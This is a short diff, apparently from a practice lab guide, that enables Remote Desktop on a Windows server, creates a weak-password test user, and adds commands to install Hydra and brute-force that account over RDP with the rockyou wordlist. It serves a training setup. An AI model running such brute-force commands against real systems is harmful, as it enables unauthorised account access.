@@ -31,3 +31,9 @@ Windows Defender Firewall → Inbound Rules → Enable "Remote Desktop (TCP-In)"
 
 # Create Test User
 net user attackerlab Password123 /add
+
+# Install Hydra
+sudo apt update && sudo apt install hydra
+
+# Run Brute Force Attack
+hydra -t 4 -V -f -l attackerlab -P /usr/share/wordlists/rockyou.txt rdp://<Windows_Server_IP>
